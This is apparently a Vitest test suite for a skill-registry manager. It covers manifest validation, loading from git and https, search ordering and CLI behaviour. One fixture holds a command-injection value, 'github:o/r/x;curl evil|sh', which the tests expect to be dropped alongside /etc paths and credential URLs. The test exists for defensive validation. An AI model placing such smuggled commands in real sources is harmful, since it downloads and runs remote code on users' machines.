import { execFileSync, spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { allowProtocolsForTests, setGitExecForTests } from "./git.js";
import { DEFAULT_REGISTRY, makeContext, registriesOf, validateManifest } from "./manifest.js";
import { addFromRegistry } from "./ops.js";
import { isRegistryName, loadRegistries, loadRegistry, resolveRegistryName, searchRegistries } from "./registry.js";
import type { Context, LoadedRegistry, Manifest, RegistrySpec } from "./types.js";

const realExec = { fn: execFileSync };
const exec = vi.fn<typeof execFileSync>(execFileSync);
const savedEnv = { ...process.env };

let base: string, home: string, proj: string, ctx: Context;

beforeEach(() => {
  base = fs.mkdtempSync(path.join(os.tmpdir(), "skwf-reg-"));
  home = path.join(base, "home");
  proj = path.join(base, "proj");
  for (const d of [home, proj]) fs.mkdirSync(d, { recursive: true });
  ctx = makeContext({ cwd: proj, home });
  setGitExecForTests(exec);
});
afterEach(() => {
  for (const k of Object.keys(process.env)) if (!(k in savedEnv)) delete process.env[k];
  Object.assign(process.env, savedEnv);
  exec.mockImplementation(realExec.fn);
  exec.mockClear();
  setGitExecForTests(undefined);
  allowProtocolsForTests(["file"]);
  vi.unstubAllGlobals();
  fs.rmSync(base, { recursive: true, force: true });
});

// ------------------------------------------------------------------ helpers
function git(...args: string[]): string {
  return realExec
    .fn("git", ["-c", "user.name=t", "-c", "user.email=t@example.invalid", "-c", "commit.gpgsign=false", ...args], {
      stdio: ["ignore", "pipe", "pipe"],
    })
    .toString()
    .trim();
}

let repoCount = 0;
/** A bare repository at <base>/srv/<repoPath>.git whose single commit is built by `build`. */
function makeRepo(repoPath: string, build: (work: string) => void): void {
  const work = path.join(base, "work", String(repoCount++));
  git("init", "--quiet", work);
  build(work);
  git("-C", work, "add", "-A");
  git("-C", work, "commit", "--quiet", "-m", "one");
  const bare = path.join(base, "srv", `${repoPath}.git`);
  fs.mkdirSync(path.dirname(bare), { recursive: true });
  git("clone", "--quiet", "--bare", work, bare);
}

/** Route these URL prefixes to the bare repositories under <base>/srv through git's own insteadOf config. No network. */
function routeHosts(prefixes: string[]): void {
  const entries: [string, string][] = [
    ...prefixes.map((p): [string, string] => [`url.file://${path.join(base, "srv")}/.insteadOf`, p]),
    ["uploadpack.allowAnySHA1InWant", "true"],
  ];
  process.env.GIT_CONFIG_COUNT = String(entries.length);
  entries.forEach(([k, v], i) => {
    process.env[`GIT_CONFIG_KEY_${i}`] = k;
    process.env[`GIT_CONFIG_VALUE_${i}`] = v;
  });
}
const HOSTS = ["https://github.com/", "https://gitlab.com/", "https://git.acme.test/", "ssh://git@git.acme.test/"];

const entry = (name: string, source = `github:a/b/${name}`, description = `the ${name} skill`) => ({ name, description, source });
const index = (...skills: object[]) => JSON.stringify({ version: 1, skills });

function writeIndex(file: string, ...skills: object[]): string {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, index(...skills));
  return file;
}
function writeManifest(root: string, m: object): void {
  fs.mkdirSync(root, { recursive: true });
  fs.writeFileSync(path.join(root, "skillwharf.json"), JSON.stringify({ version: 1, agents: ["claude"], skills: {}, ...m }));
}
const names = (r: { index?: { skills: { name: string }[] } }) => (r.index?.skills ?? []).map((s) => s.name);

// ------------------------------------------------------------------ S2.1 the manifest
describe("S2.1: registries in the manifest", () => {
  const base1 = (extra: object): Manifest => ({ version: 1, agents: ["claude"], skills: {}, ...extra }) as Manifest;

  it("the old registry string loads as [{ name: registry, location }]", () => {
    expect(registriesOf(base1({ registry: "https://example.invalid/index.json" }))).toEqual([
      { name: "registry", location: "https://example.invalid/index.json" },
    ]);
  });

  it("nothing listed means the public registry", () => {
    expect(registriesOf(base1({}))).toEqual([{ name: "default", location: "default" }]);
  });

  it("an explicit empty list means no registries", () => {
    expect(registriesOf(base1({ registries: [] }))).toEqual([]);
  });

  it("a list keeps its order, and the old field is appended after it", () => {
    const m = base1({ registries: [{ name: "team", location: "./team.json" }], registry: "https://example.invalid/i.json" });
    expect(registriesOf(m).map((r) => r.name)).toEqual(["team", "registry"]);
  });

  it.each<[string, unknown, RegExp]>([
    ["not an array", "x", /registries.*array/],
    ["an entry that is not an object", ["x"], /registries\[0\]/],
    ["a name that is not a skill-style name", [{ name: "Bad Name", location: "./x" }], /registry name/],
    ["a duplicate name", [{ name: "a", location: "./x" }, { name: "a", location: "./y" }], /more than once/],
    ["an empty location", [{ name: "a", location: "" }], /location/],
    ["a location that is not a string", [{ name: "a", location: 5 }], /location/],
    ["a location with a control character", [{ name: "a", location: "./x\u001b[31m" }], /control/],
    ["a location over 1000 characters", [{ name: "a", location: "x".repeat(1001) }], /location/],
  ])("validateManifest refuses %s", (_what, registries, re) => {
    expect(() => validateManifest(base1({ registries }), "m.json")).toThrow(re);
  });

  it("validateManifest refuses the old field next to a list entry that is also named registry", () => {
    expect(() =>
      validateManifest(base1({ registry: "https://example.invalid/i.json", registries: [{ name: "registry", location: "./x" }] }), "m.json"),
    ).toThrow(/registry.*more than once|named "registry"/);
  });

  it("validateManifest refuses an old registry field that is not a string", () => {
    expect(() => validateManifest(base1({ registry: 5 }), "m.json")).toThrow(/registry.*string/);
  });

  it("validateManifest accepts a good list", () => {
    expect(() =>
      validateManifest(base1({ registries: [{ name: "team", location: "git+https://git.acme.test/team/registry.git" }] }), "m.json"),
    ).not.toThrow();
  });
});

// ------------------------------------------------------------------ S2.2 loading
describe("S2.2: loading a registry from https, a git repository or a path", () => {
  it("loads an index from a git repository's root", async () => {
    makeRepo("team/registry", (w) => writeIndex(path.join(w, "index.json"), entry("one", "git+https://git.acme.test/team/skills.git//one"), entry("two")));
    routeHosts(HOSTS);
    const idx = await loadRegistry("git+https://git.acme.test/team/registry.git");
    expect(idx.skills.map((s) => s.name)).toEqual(["one", "two"]);
    expect(idx.skills[0].source).toBe("git+https://git.acme.test/team/skills.git//one");
  });

  it("loads from a GitHub shorthand, a folder inside the repository and an ssh URL", async () => {
    makeRepo("acme/registry", (w) => writeIndex(path.join(w, "index.json"), entry("root")));
    makeRepo("team/registry", (w) => writeIndex(path.join(w, "reg", "index.json"), entry("nested")));
    routeHosts(HOSTS);
    expect(names({ index: await loadRegistry("github:acme/registry") })).toEqual(["root"]);
    expect(names({ index: await loadRegistry("git+https://git.acme.test/team/registry.git//reg") })).toEqual(["nested"]);
    expect(names({ index: await loadRegistry("git+ssh://git@git.acme.test/team/registry.git//reg") })).toEqual(["nested"]);
  });

  it("refuses an index.json that is a symlink, even to a file inside the repository", async () => {
    makeRepo("team/registry", (w) => {
      writeIndex(path.join(w, "real.json"), entry("one"));
      fs.symlinkSync("real.json", path.join(w, "index.json"));
    });
    routeHosts(HOSTS);
    await expect(loadRegistry("git+https://git.acme.test/team/registry.git")).rejects.toThrow(/not a regular file/);
  });

  it("refuses an index.json over 5 MB", async () => {
    makeRepo("team/registry", (w) => fs.writeFileSync(path.join(w, "index.json"), " ".repeat(5 * 1024 * 1024 + 1)));
    routeHosts(HOSTS);
    await expect(loadRegistry("git+https://git.acme.test/team/registry.git")).rejects.toThrow(/larger than 5 MB/);
  });

  it("says so when the repository has no index.json", async () => {
    makeRepo("team/registry", (w) => fs.writeFileSync(path.join(w, "README.md"), "hi"));
    routeHosts(HOSTS);
    await expect(loadRegistry("git+https://git.acme.test/team/registry.git")).rejects.toThrow(/Registry index not found/);
  });

  it("leaves no temp folder behind, success or failure", async () => {
    const tmp = path.join(base, "tmp");
    fs.mkdirSync(tmp);
    process.env.TMPDIR = tmp;
    makeRepo("team/registry", (w) => writeIndex(path.join(w, "index.json"), entry("one")));
    routeHosts(HOSTS);
    await loadRegistry("git+https://git.acme.test/team/registry.git");
    await expect(loadRegistry("git+https://git.acme.test/team/missing.git")).rejects.toThrow();
    expect(fs.readdirSync(tmp)).toEqual([]);
  });

  it("a git registry is fetched with the same guards as a skill", async () => {
    makeRepo("team/registry", (w) => writeIndex(path.join(w, "index.json"), entry("one")));
    routeHosts(HOSTS);
    await loadRegistry("git+https://git.acme.test/team/registry.git", { timeoutMs: 7000 });
    const calls = exec.mock.calls.filter((c) => c[0] === "git");
    expect(calls[0][1]).toEqual(["clone", "--depth", "1", "--quiet", "--", "https://git.acme.test/team/registry.git", expect.any(String)]);
    for (const c of calls) {
      const o = c[2] as Record<string, unknown>;
      expect((o.env as Record<string, string>).GIT_ALLOW_PROTOCOL).toMatch(/^https:ssh/);
      expect((o.env as Record<string, string>).GIT_TERMINAL_PROMPT).toBe("0");
      expect((o.stdio as string[])[0]).toBe("ignore");
      expect(o.timeout).toBe(7000);
    }
  });

  it("the location default is the public registry", async () => {
    const fetchSpy = vi.fn(async () => new Response(index(entry("pdf"))));
    vi.stubGlobal("fetch", fetchSpy);
    const idx = await loadRegistry("default");
    expect(idx.skills.map((s) => s.name)).toEqual(["pdf"]);
    expect(fetchSpy.mock.calls[0]).toEqual([DEFAULT_REGISTRY, expect.objectContaining({ redirect: "error" })]);
  });

  it("refuses an https registry URL with credentials without making a request", async () => {
    const fetchSpy = vi.fn(async () => new Response("{}"));
    vi.stubGlobal("fetch", fetchSpy);
    await expect(loadRegistry("https://user:pw@example.invalid/index.json")).rejects.toThrow(/credential/);
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it("still refuses plain http", async () => {
    await expect(loadRegistry("http://example.invalid/index.json")).rejects.toThrow(/https/);
  });

  it("every index goes through the same schema check: any git host kept; path, file and git sources dropped", async () => {
    const file = writeIndex(
      path.join(base, "i.json"),
      entry("gh", "github:a/b/x"),
      entry("gl", "gitlab:a/b/c//x"),
      entry("bb", "bitbucket:a/b/x"),
      entry("own", "git+https://git.acme.test/team/skills.git//x"),
      entry("ssh", "git+ssh://git@git.acme.test/team/skills.git//x"),
      entry("local", "path:/etc"),
      entry("file", "file:///etc"),
      entry("plain", "git://git.acme.test/x.git"),
      entry("creds", "git+https://u:p@git.acme.test/x.git"),
      entry("shell", "github:o/r/x;curl evil|sh"),
    );
    expect((await loadRegistry(file)).skills.map((s) => s.name)).toEqual(["gh", "gl", "bb", "own", "ssh"]);
  });

  it("descriptions are cut to 300 characters and cleaned, and unknown fields are not passed on", async () => {
    const file = writeIndex(path.join(base, "i.json"), { ...entry("x", "github:a/b/x", "d".repeat(400) + "\u001b[31m"), extra: "no" });
    const [e] = (await loadRegistry(file)).skills;
    expect(e.description).toHaveLength(300);
    expect(e).not.toHaveProperty("extra");
  });
});

// ------------------------------------------------------------------ S2.2 several registries
describe("S2.2: a registry that fails to load is reported by name, the others still answer", () => {
  it("returns one result per registry, in order", async () => {
    const good = writeIndex(path.join(base, "good.json"), entry("one"));
    const specs: RegistrySpec[] = [
      { name: "broken", location: path.join(base, "missing.json") },
      { name: "good", location: good },
      { name: "gone", location: "git+https://git.acme.test/gone/registry.git" },
    ];
    routeHosts(HOSTS);
    const r = await loadRegistries(ctx, { only: specs });
    expect(r.map((x) => x.name)).toEqual(["broken", "good", "gone"]);
    expect(r[0].error).toMatch(/Registry index not found/);
    expect(names(r[1])).toEqual(["one"]);
    expect(r[1].error).toBeUndefined();
    expect(r[2].error).toMatch(/git\.acme\.test\/gone\/registry\.git/);
    expect(r.map((x) => x.scope)).toEqual(["cli", "cli", "cli"]);
  });
});

describe("S2.1: the global list comes first, the project list after", () => {
  const globalRoot = () => path.join(home, ".skillwharf");
  let a: string, b: string, c: string;
  beforeEach(() => {
    a = writeIndex(path.join(base, "a.json"), entry("from-a"));
    b = writeIndex(path.join(base, "b.json"), entry("from-b"));
    c = writeIndex(path.join(base, "c.json"), entry("from-c"));
  });

  it("appends the project's registries after the global ones", async () => {
    writeManifest(globalRoot(), { registries: [{ name: "company", location: a }] });
    writeManifest(proj, { registries: [{ name: "team", location: b }] });
    const r = await loadRegistries(ctx);
    expect(r.map((x) => [x.name, x.scope])).toEqual([["company", "global"], ["team", "project"]]);
    expect(r.flatMap(names)).toEqual(["from-a", "from-b"]);
  });

  it("a project that lists nothing uses the global list alone, and neither listing means the public registry", async () => {
    writeManifest(globalRoot(), { registries: [{ name: "company", location: a }] });
    writeManifest(proj, {});
    expect((await loadRegistries(ctx)).map((x) => x.name)).toEqual(["company"]);

    fs.rmSync(globalRoot(), { recursive: true });
    vi.stubGlobal("fetch", async () => new Response(index(entry("pdf"))));
    const r = await loadRegistries(ctx);
    expect(r.map((x) => [x.name, x.location])).toEqual([["default", "default"]]);
    expect(names(r[0])).toEqual(["pdf"]);
  });

  it("the same name at the same location is one registry, at the global position", async () => {
    writeManifest(globalRoot(), { registries: [{ name: "company", location: a }, { name: "x", location: c }] });
    writeManifest(proj, { registries: [{ name: "company", location: a }, { name: "team", location: b }] });
    expect((await loadRegistries(ctx)).map((x) => [x.name, x.scope])).toEqual([["company", "global"], ["x", "global"], ["team", "project"]]);
  });

  it("the same name at another location: the project keeps the name, the global one becomes global:<name>", async () => {
    writeManifest(globalRoot(), { registries: [{ name: "company", location: a }] });
    writeManifest(proj, { registries: [{ name: "company", location: b }] });
    const r = await loadRegistries(ctx);
    expect(r.map((x) => [x.name, x.scope])).toEqual([["global:company", "global"], ["company", "project"]]);
    expect(r.flatMap(names)).toEqual(["from-a", "from-b"]);
  });

  it("a relative path location is read from the folder of the manifest that lists it", async () => {
    writeIndex(path.join(proj, "reg", "index.json"), entry("local-one"));
    writeManifest(proj, { registries: [{ name: "local", location: "./reg" }] });
    const r = await loadRegistries(ctx);
    expect(names(r[0])).toEqual(["local-one"]);
  });

  it("with --global only the global manifest is read", async () => {
    writeManifest(globalRoot(), { registries: [{ name: "company", location: a }] });
    writeManifest(proj, { registries: [{ name: "team", location: b }] });
    const r = await loadRegistries(makeContext({ global: true, home }));
    expect(r.map((x) => x.name)).toEqual(["company"]);
  });

  it("the old registry field keeps working and is named registry", async () => {
    writeManifest(proj, { registry: a });
    const r = await loadRegistries(ctx);
    expect(r.map((x) => x.name)).toEqual(["registry"]);
    expect(names(r[0])).toEqual(["from-a"]);
  });
});

// ------------------------------------------------------------------ S2.3 / S2.4 search and add
const loaded = (name: string, ...skills: object[]): LoadedRegistry => ({
  name,
  location: `./${name}.json`,
  scope: "project",
  index: { version: 1, skills: skills as never },
});

describe("S2.3: search rows carry the registry, and keep each registry's own entry", () => {
  it("orders by score, then by registry order, and shows a name two registries share as two rows", () => {
    const a = loaded("a", entry("pdf-extra", "github:a/b/pdf-extra", "extra pdf things"), entry("pdf", "github:a/b/pdf", "pdf tools"));
    const b = loaded("b", entry("pdf", "gitlab:b/c//pdf", "pdf tools, company copy"));
    const hits = searchRegistries([a, b], "pdf");
    expect(hits.map((h) => [h.registry, h.name])).toEqual([["a", "pdf"], ["b", "pdf"], ["a", "pdf-extra"]]);
    expect(hits[0].source).toBe("github:a/b/pdf");
    expect(hits[1].source).toBe("gitlab:b/c//pdf");
  });

  it("a registry that failed to load contributes no rows", () => {
    const broken: LoadedRegistry = { name: "broken", location: "./x", scope: "project", error: "nope" };
    expect(searchRegistries([broken, loaded("a", entry("pdf"))], "pdf").map((h) => h.registry)).toEqual(["a"]);
  });
});

describe("S2.4: add <name> resolves through the registries, in order", () => {
  it("takes the only entry with that name", () => {
    const r = resolveRegistryName([loaded("a", entry("pdf", "github:a/b/pdf")), loaded("b", entry("ocr"))], "ocr");
    expect(r.registry).toBe("b");
    expect(r.entry.source).toBe("github:a/b/ocr");
  });

  it("refuses when two registries list the name, showing both", () => {
    const regs = [loaded("a", entry("pdf", "github:a/b/pdf")), loaded("b", entry("pdf", "gitlab:g/r//pdf"))];
    expect(() => resolveRegistryName(regs, "pdf")).toThrow(
      '"pdf" is listed by a (github:a/b/pdf) and b (gitlab:g/r//pdf); pick one with --from <registry>',
    );
  });

  it("--from picks one registry", () => {
    const regs = [loaded("a", entry("pdf", "github:a/b/pdf")), loaded("b", entry("pdf", "gitlab:g/r//pdf"))];
    expect(resolveRegistryName(regs, "pdf", "b").entry.source).toBe("gitlab:g/r//pdf");
  });

  it("--from with an unknown registry lists the known ones", () => {
    expect(() => resolveRegistryName([loaded("a"), loaded("b")], "pdf", "zzz")).toThrow(/no registry named "zzz"; known: a, b/);
  });

  it("--from a registry that failed to load says why", () => {
    const broken: LoadedRegistry = { name: "broken", location: "./x", scope: "project", error: "Registry index not found at ./x" };
    expect(() => resolveRegistryName([broken], "pdf", "broken")).toThrow(/registry "broken" could not be loaded: Registry index not found/);
  });

  it("--from a registry that does not list the name says so", () => {
    expect(() => resolveRegistryName([loaded("a", entry("ocr"))], "pdf", "a")).toThrow(/"pdf" is not in registry "a"/);
  });

  it("no registry lists it: the error says how to add a local folder", () => {
    expect(() => resolveRegistryName([loaded("a", entry("ocr"))], "pdf")).toThrow(
      "`pdf` is not in any registry; for a local folder use `./pdf`",
    );
  });

  it("names a registry that could not be loaded, since the skill may be in it", () => {
    const broken: LoadedRegistry = { name: "broken", location: "./x", scope: "project", error: "boom" };
    expect(() => resolveRegistryName([broken, loaded("a")], "pdf")).toThrow(/not in any registry.*broken: boom/s);
  });

  it.each([
    ["pdf", true],
    ["release-notes", true],
    ["github:a/b/x", false],
    ["git+https://h.example/r.git", false],
    ["./pdf", false],
    ["../pdf", false],
    ["~/pdf", false],
    ["a/b", false],
    ["Skills", false],
    ["my_skill", false],
    ["C:\\skills", false],
  ])("isRegistryName(%s) is %s", (arg, want) => {
    expect(isRegistryName(arg)).toBe(want);
  });
});

describe("S2.4: addFromRegistry installs what the registry says", () => {
  const alphaRepo = (w: string) => {
    fs.mkdirSync(path.join(w, "alpha"), { recursive: true });
    fs.writeFileSync(path.join(w, "alpha", "SKILL.md"), "---\nname: alpha\ndescription: d\n---\nbody\n");
  };
  beforeEach(() => {
    makeRepo("team/skills", alphaRepo);
    makeRepo("acme/skills", alphaRepo);
    routeHosts(HOSTS);
  });

  it("records the git source, not the name, in the manifest", async () => {
    const idx = writeIndex(path.join(base, "team.json"), entry("alpha", "git+https://git.acme.test/team/skills.git//alpha"));
    writeManifest(proj, { registries: [{ name: "team", location: idx }] });
    const added = await addFromRegistry(ctx, "alpha", {});
    expect(added.map((a) => a.name)).toEqual(["alpha"]);
    const m = JSON.parse(fs.readFileSync(path.join(proj, "skillwharf.json"), "utf8")) as Manifest;
    expect(m.skills.alpha.source).toBe("git+https://git.acme.test/team/skills.git//alpha");
  });

  it("takes the first registry's entry when only one lists the name, and warns about one that failed", async () => {
    const ok = writeIndex(path.join(base, "ok.json"), entry("alpha", "github:acme/skills/alpha"));
    writeManifest(proj, {
      registries: [{ name: "broken", location: path.join(base, "missing.json") }, { name: "ok", location: ok }],
    });
    const warnings: string[] = [];
    await addFromRegistry(ctx, "alpha", { onWarning: (w) => warnings.push(w) });
    expect(warnings).toEqual([expect.stringMatching(/registry broken: .*Registry index not found/)]);
  });

  it("refuses a name two registries list, and --from picks one", async () => {
    const one = writeIndex(path.join(base, "one.json"), entry("alpha", "github:acme/skills/alpha"));
    const two = writeIndex(path.join(base, "two.json"), entry("alpha", "git+https://git.acme.test/team/skills.git//alpha"));
    writeManifest(proj, { registries: [{ name: "one", location: one }, { name: "two", location: two }] });
    await expect(addFromRegistry(ctx, "alpha", {})).rejects.toThrow(/"alpha" is listed by one \(github:acme\/skills\/alpha\) and two \(git\+https:\/\/git\.acme\.test\/team\/skills\.git\/\/alpha\); pick one with --from <registry>/);
    expect(fs.existsSync(path.join(proj, ".skillwharf"))).toBe(false);
    await addFromRegistry(ctx, "alpha", { from: "two" });
    const m = JSON.parse(fs.readFileSync(path.join(proj, "skillwharf.json"), "utf8")) as Manifest;
    expect(m.skills.alpha.source).toBe("git+https://git.acme.test/team/skills.git//alpha");
  });

  it("does not load a registry when asked for a registry that is not there", async () => {
    writeManifest(proj, { registries: [{ name: "one", location: writeIndex(path.join(base, "one.json"), entry("alpha")) }] });
    await expect(addFromRegistry(ctx, "alpha", { from: "nope" })).rejects.toThrow(/no registry named "nope"; known: one/);
  });
});

// ------------------------------------------------------------------ the command line
describe("search and add on the command line", () => {
  const repo = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
  function cli(args: string[]) {
    const r = spawnSync(process.execPath, [path.join(repo, "node_modules/tsx/dist/cli.mjs"), path.join(repo, "src/cli.ts"), ...args], {
      cwd: proj,
      env: { ...process.env, SKILLWHARF_HOME: home },
      encoding: "utf8",
    });
    return { stdout: r.stdout, stderr: r.stderr, status: r.status };
  }
  let a: string, b: string;
  beforeEach(() => {
    a = writeIndex(path.join(base, "a.json"), entry("pdf", "github:a/b/pdf", "pdf tools"));
    b = writeIndex(path.join(base, "b.json"), entry("pdf", "gitlab:g/r//pdf", "company pdf"));
  });

  it("search --registry <path> still works, with the rows named registry", () => {
    const r = cli(["search", "pdf", "--registry", a, "--json"]);
    expect(r.status).toBe(0);
    const rows = JSON.parse(r.stdout) as { registry: string; name: string }[];
    expect(rows.map((x) => [x.registry, x.name])).toEqual([["registry", "pdf"]]);
  });

  it("search asks every registry the manifest lists, and the JSON rows carry the registry name", () => {
    writeManifest(proj, { registries: [{ name: "pub", location: a }, { name: "company", location: b }] });
    const r = cli(["search", "pdf", "--json"]);
    expect(r.status).toBe(0);
    const rows = JSON.parse(r.stdout) as { registry: string; source: string }[];
    expect(rows.map((x) => [x.registry, x.source])).toEqual([["pub", "github:a/b/pdf"], ["company", "gitlab:g/r//pdf"]]);
  });

  it("the table has a registry column when there is more than one registry", () => {
    writeManifest(proj, { registries: [{ name: "pub", location: a }, { name: "company", location: b }] });
    // eslint-disable-next-line no-control-regex
    const out = cli(["search", "pdf"]).stdout.replace(/\u001b\[[0-9;]*m/g, "");
    expect(out).toMatch(/skill\s+registry\s+description/);
    expect(out).toMatch(/pdf\s+pub\s/);
    expect(out).toMatch(/pdf\s+company\s/);
  });

  it("a registry that fails is reported on stderr by name; the others still answer and stdout stays JSON", () => {
    writeManifest(proj, { registries: [{ name: "broken", location: path.join(base, "missing.json") }, { name: "pub", location: a }] });
    const r = cli(["search", "pdf", "--json"]);
    expect(r.status).toBe(0);
    expect(r.stderr).toMatch(/registry broken: .*Registry index not found/);
    expect((JSON.parse(r.stdout) as unknown[]).length).toBe(1);
  });

  it("search fails when every registry fails", () => {
    writeManifest(proj, { registries: [{ name: "broken", location: path.join(base, "missing.json") }] });
    const r = cli(["search", "pdf"]);
    expect(r.status).toBe(1);
    expect(r.stderr).toMatch(/registry broken/);
  });

  it("add --from with a source says --from is for names", () => {
    writeManifest(proj, {});
    const r = cli(["add", "github:a/b/x", "--from", "pub"]);
    expect(r.status).toBe(1);
    expect(r.stderr).toMatch(/--from.*skill name/);
  });

  it("add <name> that no registry lists says how to add a local folder", () => {
    writeManifest(proj, { registries: [{ name: "pub", location: a }] });
    const r = cli(["add", "nothing-here"]);
    expect(r.status).toBe(1);
    expect(r.stderr).toContain("`nothing-here` is not in any registry; for a local folder use `./nothing-here`");
  });
});
